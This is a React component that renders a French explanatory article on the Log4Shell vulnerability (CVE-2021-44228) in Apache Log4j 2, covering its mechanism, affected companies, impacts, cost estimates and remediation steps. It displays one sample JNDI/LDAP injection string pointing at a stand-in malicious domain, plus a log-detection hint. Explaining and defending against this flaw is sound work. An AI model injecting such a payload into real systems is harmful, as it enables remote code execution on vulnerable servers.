"use client"

import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import {
  Card,
  CardContent,
} from "@/components/ui/card"

export function Log4Shell() {
    return (
        <>
            <p className="text-xl text-muted-foreground mb-6 leading-relaxed">
                En décembre 2021, une vulnérabilité critique secouait l’ensemble de la communauté tech. Baptisée Log4Shell, cette faille affectait Apache Log4j 2, une bibliothèque Java omniprésente dans les systèmes d’information du monde entier. Sa simplicité d’exploitation, combinée à sa portée colossale, en a fait l’une des failles les plus dangereuses de la dernière décennie.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Quelle est la vulnérabilité exploitée ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Log4Shell correspond à la faille CVE-2021-44228, identifiée dans Apache Log4j 2, un composant Java destiné à la journalisation d’événements (logs). Très utilisée dans les applications professionnelles, cette bibliothèque permettait d’intégrer dynamiquement des données issues de sources externes.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                Le cœur du problème : la fonction de résolution JNDI (Java Naming and Directory Interface), activée par défaut, autorisait une exécution de code à distance (Remote Code Execution – RCE). En d’autres termes, un attaquant pouvait forcer Log4j à charger et exécuter du code malveillant hébergé sur un serveur externe, sans authentification préalable.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Comment l’attaque s’est-elle déroulée ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                La mécanique était à la fois simple et redoutable. Un pirate n’avait qu’à injecter une chaîne de type :
            </p>
            {/* card */}
            <Card className="bg-neutral-950 mb-6">
                <CardContent>
                <p className="text-white">
                    <span className="text-pink-500">{"${"}</span>
                    <span className="text-red-500">jndi:ldap:</span>
                    /
                    <span className="text-green-500">/malicious.domain/a</span>
                    {"}"}
                </p>
                </CardContent>
            </Card>
            <p className="text-xl mb-6 leading-relaxed">
                …dans n’importe quel champ journalisé par Log4j : un en-tête HTTP comme User-Agent, un pseudo dans un formulaire, un message dans un chat... Si Log4j enregistrait ce champ, il résolvait dynamiquement la ressource LDAP et téléchargeait du code potentiellement malveillant pour l’exécuter localement.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                En clair : une ligne de texte suffisait pour prendre le contrôle d’un serveur.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Qui a été touché ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Presque tout l’écosystème Java a été exposé. En effet, Log4j était massivement utilisé dans des applications d’entreprise, frameworks open-source, plateformes cloud, solutions embarquées, souvent à l’insu même des équipes de développement.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                Des entreprises comme Apple, Amazon, Tesla, Twitter, Cloudflare ou encore Minecraft (Microsoft) ont été directement concernées. Des milliers d’organisations ont dû mobiliser leurs équipes pour analyser, corriger et sécuriser leurs systèmes dans l’urgence.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                La faille affectait toutes les versions de Log4j antérieures à 2.15.0.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Quels ont été les impacts ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Les exploitations réelles n’ont pas tardé : des groupes cybercriminels et des botnets ont utilisé la faille pour :
                <br />
                <ul className="list-disc pl-6 mt-4 mb-6">
                <li>Obtenir un accès total aux serveurs ciblés</li>
                <li>Voler des données sensibles</li>
                <li>Déployer des ransomwares</li>
                <li>Intégrer les machines à des réseaux de minage ou d’attaques DDoS</li>
                <li>Compromettre des services critiques (santé, industrie, services publics)</li>
                </ul>
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                Cette attaque a été qualifiée de “logique à impact global”, affectant de manière transverse tous les secteurs.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Quel coût estimé selon la taille des entreprises ?</h2>
            <Table className="mb-6">
                <TableHeader>
                <TableRow>
                    <TableHead>Taille d’entreprise</TableHead>
                    <TableHead>Coûts estimés</TableHead>
                </TableRow>
                </TableHeader>
                <TableBody>
                <TableRow>
                    <TableCell className="font-medium">Petite entreprise</TableCell>
                    <TableCell>50 000 € à 200 000 € (arrêt d’activité, perte de données)</TableCell>
                </TableRow>
                <TableRow>
                    <TableCell className="font-medium">Moyenne entreprise</TableCell>
                    <TableCell>500 000 € à 2 millions €</TableCell>
                </TableRow>
                <TableRow>
                    <TableCell className="font-medium">Grande entreprise</TableCell>
                    <TableCell>Jusqu’à plusieurs centaines de millions € (sanctions, image, réponse à incident)</TableCell>
                </TableRow>
                </TableBody>
            </Table>
            <p className="text-xl mb-6 leading-relaxed">
                Les frais englobent les audits, le remplacement de composants, la mise à jour des systèmes, la mobilisation des équipes techniques, la communication de crise, et parfois des amendes RGPD.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Comment s’en protéger ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Face à une telle faille, la réactivité est cruciale. Les bonnes pratiques recommandées sont :
                <br />
                <ul className="list-disc pl-6 mt-4 mb-6">
                <li>Mettre à jour Log4j vers la version 2.17.0 ou supérieure</li>
                <li>Désactiver JNDI dans la configuration si non nécessaire</li>
                <li>Bloquer les appels sortants non essentiels depuis les serveurs</li>
                <li>Analyser les journaux pour détecter des chaînes suspectes (ex. <mark className="bg-neutral-200">{"${jndi}"}</mark> )</li>
                <li>Segmenter le réseau pour limiter la propagation en cas d’intrusion</li>
                </ul>
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                L’exploitation étant très facile à automatiser, des scanners et des payloads ont été intégrés à des outils d’attaque dès les premières heures suivant la divulgation de la faille.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Pourquoi était-ce si difficile à éviter ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                La principale difficulté réside dans l’omniprésence de Log4j, souvent utilisé de manière indirecte via des dépendances tierces (transitive dependencies). De nombreuses équipes ignoraient même qu’elles l’utilisaient.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                De plus :
                <br />
                <ul className="list-disc pl-6 mt-4 mb-6">
                <li>L’exécution du code ne nécessitait aucune authentification</li>
                <li>L’injection pouvait passer par des champs anodins</li>
                <li>Le code malveillant pouvait être modifié à distance en temps réel</li>
                </ul>
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                Cette ubiquité silencieuse en a fait une bombe à retardement pour les entreprises non préparées.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Et dans une entreprise, que faire concrètement ?</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Une bonne réponse passe par plusieurs niveaux :
                <br />
                <ul className="list-decimal pl-6 mt-4 mb-6">
                <li>Audit complet de tous les systèmes Java pour détecter la présence de Log4j vulnérable</li>
                <li>Mise à jour immédiate ou remplacement des versions exposées</li>
                <li>Surveillance renforcée des journaux et détection active via SIEM</li>
                <li>Mise en place d’un SBOM (Software Bill of Materials) pour cartographier les composants logiciels</li>
                <li>Création de procédures de gestion des vulnérabilités 0-day pour réagir rapidement</li>
                </ul>
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                La faille Log4Shell rappelle à tous un fait simple mais souvent oublié : une seule dépendance négligée peut compromettre toute une infrastructure.
            </p>

            <h2 className="text-2xl md:text-3xl font-bold mb-4 leading-tight">Une leçon de cybersécurité gravée dans le code</h2>
            <p className="text-xl mb-6 leading-relaxed">
                Log4Shell n’était pas un exploit sophistiqué : c’était une erreur de conception, combinée à de mauvaises pratiques de sécurité. Son impact n’est pas dû à sa complexité, mais à l’absence de gouvernance logicielle dans beaucoup d’organisations.
            </p>
            <p className="text-xl mb-6 leading-relaxed">
                Dans un monde où le logiciel libre est omniprésent, la vigilance sur les dépendances, la traçabilité du code, et la préparation aux incidents ne sont plus optionnelles. Elles sont devenues essentielles à la survie numérique des entreprises.
            </p>
        </>
    );
}